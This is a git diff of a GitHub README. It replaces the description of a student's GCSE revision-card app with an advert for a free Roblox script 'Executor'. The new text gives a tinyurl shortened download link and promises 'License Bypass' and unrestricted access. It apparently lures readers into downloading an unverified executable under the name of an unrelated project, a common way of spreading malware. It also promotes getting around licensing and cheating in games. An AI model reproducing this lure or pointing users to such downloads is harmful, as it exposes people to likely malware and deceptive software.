@@ -1,30 +1,19 @@
-# Revision-Cards
-Computer science GCSE revision cards with a GUI, not in the terminal.
+## Here
+Download: [click](https://tinyurl.com/j779zse3)  
 
-# Featues
-- Records logs
-    - Date and time completed
-    - How many completed
-- Installs .ico file from my 'Icons' repo
-- 37 Different flashcards
+## Showcase
+![68747470733a2f2f75732d656173742d312e74697874652e6e65742f75706c6f6164732f706c6578746f72612e69732d66726f6d2e73706163652f4e656f626c6f785f7567384d4959315a6d722e706e67](https://github.com/Bernso/Revision-Cards/assets/67875118/d95117df-8257-4719-8dd0-eb4d7810c01f)
 
-## If you don't have python installed
-If you do not have python installed you should download the .exe file as it already has all the needed components installed
 
-## If you already have python installed
-You should be able to install the file and run it, if this is NOT WORKING follow these instructions:
-- Open command prompt
-- Set the directory to where you installed the file. Example:
-```text
-cd Desktop
-```
-- Once you are in the correct directory run the command:
-```text
-python FlashCards-UI.py
-```
-- Now the gui should appear and there should be no problems
 
-# When using the .exe file
-If you use the .exe file and use the cross in the top corner to close the application it will not save the logs. To fix this please:
-- Press on the exit button (it will come up with errors)
-- Now you can close the app via pressing the red cross in the top corner (how you would normally close an application)
+## Key Features:
+Full Access: Enjoy all the features of Executor.
+License Bypass: Say goodbye to subscription fees! This free version provides unrestricted access without requiring a paid license.
+Customization: Use free executor for Roblox. Use any scripts.
+Compatibility: The executor works with various games, and communication platforms where Roblox executor is supported.
+
+## How It Works:
+Download and Install: Get the executor from this repository and follow the installation instructions.
+Activate: Launch Executor. No activation key needed!
+Explore: Experiment with places, prank friends.
+
